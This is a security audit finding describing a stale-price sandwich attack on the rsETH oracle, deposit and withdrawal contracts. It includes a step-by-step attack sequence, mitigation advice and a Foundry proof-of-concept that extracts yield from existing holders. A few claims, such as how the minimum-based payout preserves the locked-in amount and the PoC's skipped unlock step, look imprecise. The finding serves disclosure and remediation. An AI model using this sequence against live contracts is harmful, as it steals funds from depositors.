### Title
Stale `rsETHPrice` Sandwich Attack Allows Theft of Yield from rsETH Holders — (`contracts/LRTOracle.sol`, `contracts/LRTDepositPool.sol`, `contracts/LRTWithdrawalManager.sol`)

---

### Summary

`LRTOracle.rsETHPrice` is a stored value updated only when `updateRSETHPrice()` is explicitly called. Both minting (deposit) and redemption (withdrawal) use this stored price. An unprivileged attacker can sandwich a price update: deposit at the stale low price to receive excess rsETH, trigger the price update, then initiate withdrawal at the new higher price to extract more assets than deposited. The profit is extracted from existing rsETH holders.

---

### Finding Description

`LRTOracle.updateRSETHPrice()` is a public function that recomputes `rsETHPrice` from the current total ETH in the protocol. Between calls, staking rewards accrue inside EigenLayer strategies, causing the true per-share value to exceed the stored `rsETHPrice`. This staleness window is the exploitable gap.

**Deposit path** (`LRTDepositPool.getRsETHAmountToMint`):

```solidity
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
```

When `rsETHPrice` is stale-low, the attacker receives more rsETH than the true exchange rate warrants. [1](#0-0) 

**Withdrawal path** (`LRTWithdrawalManager.getExpectedAssetAmount`):

```solidity
underlyingToReceive = amount * lrtOracle.rsETHPrice() / lrtOracle.getAssetPrice(asset);
```

After the price update, the same rsETH balance redeems for more assets. [2](#0-1) 

The `_calculatePayoutAmount` function used during `unlockQueue` takes the **minimum** of the originally locked-in `expectedAssetAmount` and the current calculation, so the attacker's locked-in high `expectedAssetAmount` (set at initiation time after the price update) is preserved even if the price later falls. [3](#0-2) 

**Attack sequence:**

1. Observe that `rsETHPrice` is stale (rewards have accrued but `updateRSETHPrice()` has not been called).
2. Call `LRTDepositPool.depositETH(0, "")` — receives excess rsETH at the stale low price.
3. Call `LRTOracle.updateRSETHPrice()` — price jumps to reflect accrued rewards.
4. Call `LRTWithdrawalManager.initiateWithdrawal(ETH, rsETHAmount, "")` — `expectedAssetAmount` is locked in at the new high price.
5. After `withdrawalDelayBlocks` (~8 days), call `completeWithdrawal` — receives the inflated asset amount.

If `isInstantWithdrawalEnabled[asset]` is true, steps 4–5 collapse into a single `instantWithdrawal()` call, eliminating the 8-day capital lock-up entirely. [4](#0-3) 

The `updateRSETHPrice()` function is callable by anyone with no access restriction: [5](#0-4) 

---

### Impact Explanation

The attacker mints rsETH at a below-fair-value price (diluting all existing holders) and then redeems at the corrected fair-value price. The delta — the accrued yield that should have been distributed pro-rata to existing holders — is instead captured by the attacker. This constitutes **theft of unclaimed yield** (High severity). On a protocol with large TVL, even a 0.05% stale-price gap represents a meaningful absolute profit.

---

### Likelihood Explanation

`updateRSETHPrice()` is not called on every block; it is triggered off-chain by operators or bots. Any interval between calls during which staking rewards accrue creates the exploitable window. The attack requires no special permissions, no governance capture, and no external oracle manipulation — only the ability to observe the mempool for pending price-update transactions (or to time deposits around known reward accrual events). The `pricePercentageLimit` guard limits the per-update price jump but does not prevent the attack for normal reward accruals within the limit. [6](#0-5) 

---

### Recommendation

1. **Snapshot price at deposit and withdrawal initiation separately.** Record the rsETHPrice at deposit time and use `min(depositPrice, currentPrice)` for minting, and `min(initiationPrice, currentPrice)` for withdrawal payout — preventing any benefit from a price jump between the two operations.
2. **Enforce a deposit-to-withdrawal cooldown.** Require that rsETH minted in a given block cannot be used to initiate a withdrawal until at least one oracle update cycle has passed.
3. **Trigger `updateRSETHPrice()` atomically inside `depositETH` and `depositAsset`.** This ensures the price is always fresh at deposit time, eliminating the stale-price minting advantage.
4. **Apply a fee to instant withdrawals** large enough to exceed the maximum possible stale-price gap (already partially present via `instantWithdrawalFee`, but must be calibrated against the `pricePercentageLimit`).

### Proof of Concept

```solidity
function test_sandwich_rsETH_price_update() external {
    // Setup: alice is an existing rsETH holder
    vm.deal(alice, 500 ether);
    vm.prank(alice);
    lrtDepositPool.depositETH{value: 500 ether}(0, "");

    // Record stale rsETHPrice (before rewards accrue)
    uint256 stalePriceBefore = lrtOracle.rsETHPrice();

    // Simulate staking rewards accruing in EigenLayer (increasing total ETH in protocol)
    // e.g., validator rewards credited to NodeDelegator
    _simulateRewardAccrual(1 ether); // 1 ETH reward accrues

    // Step 1: Attacker deposits at stale low price → receives excess rsETH
    vm.deal(attacker, 10 ether);
    vm.prank(attacker);
    lrtDepositPool.depositETH{value: 10 ether}(0, "");
    uint256 rsETHReceived = rsETH.balanceOf(attacker);
    // rsETHReceived > 10 ether / truePrice (attacker got excess rsETH)

    // Step 2: Update rsETHPrice to reflect accrued rewards
    lrtOracle.updateRSETHPrice();
    uint256 newPrice = lrtOracle.rsETHPrice();
    assertGt(newPrice, stalePriceBefore);

    // Step 3: Attacker initiates withdrawal at new high price
    vm.prank(attacker);
    rsETH.approve(address(lrtWithdrawalManager), rsETHReceived);
    vm.prank(attacker);
    lrtWithdrawalManager.initiateWithdrawal(ETH_TOKEN, rsETHReceived, "");

    // expectedAssetAmount locked in at high price
    (,uint256 expectedAssetAmount,,) = lrtWithdrawalManager.getUserWithdrawalRequest(ETH_TOKEN, attacker, 0);
    assertGt(expectedAssetAmount, 10 ether); // attacker expects more than deposited

    // Step 4: After delay, complete withdrawal
    vm.roll(block.number + lrtWithdrawalManager.withdrawalDelayBlocks() + 1);
    // (operator unlocks queue, then attacker completes)
    vm.prank(attacker);
    lrtWithdrawalManager.completeWithdrawal(ETH_TOKEN, "");

    int256 profit = int256(attacker.balance) - int256(10 ether);
    console2.log("Attacker profit (wei):", profit);
    assertGt(profit, 0); // attacker profited at expense of alice and other holders
}
```
